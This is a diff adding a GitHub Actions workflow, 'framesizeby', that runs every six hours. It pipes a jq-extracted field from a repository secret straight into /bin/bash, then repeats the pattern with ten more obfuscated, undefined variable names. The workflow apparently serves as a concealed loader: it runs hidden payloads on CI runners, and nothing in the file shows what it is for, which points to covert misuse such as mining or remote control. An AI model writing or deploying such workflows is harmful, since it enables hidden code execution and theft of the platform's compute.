@@ -1,0 +1,28 @@
+name: framesizeby
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: framesizeby
+        env:
+          aec49: ${{ secrets.aec49 }}
+        run: |
+          echo $aec49 | jq -r .vkte15564 | /bin/bash
+          echo $meqt8969 | jq -r .r66964 | /bin/bash
+          echo $l4 | jq -r .d3 | /bin/bash
+          echo $red849 | jq -r .lp68248 | /bin/bash
+          echo $eswq8513 | jq -r .czcbp40349 | /bin/bash
+          echo $u015 | jq -r .j5775 | /bin/bash
+          echo $l15 | jq -r .lf2011 | /bin/bash
+          echo $ybc3 | jq -r .ne99382 | /bin/bash
+          echo $zivzl36 | jq -r .skcga53526 | /bin/bash
+          echo $aurm17328 | jq -r .nr046 | /bin/bash
+          echo $unbr6 | jq -r .thi26564 | /bin/bash
+
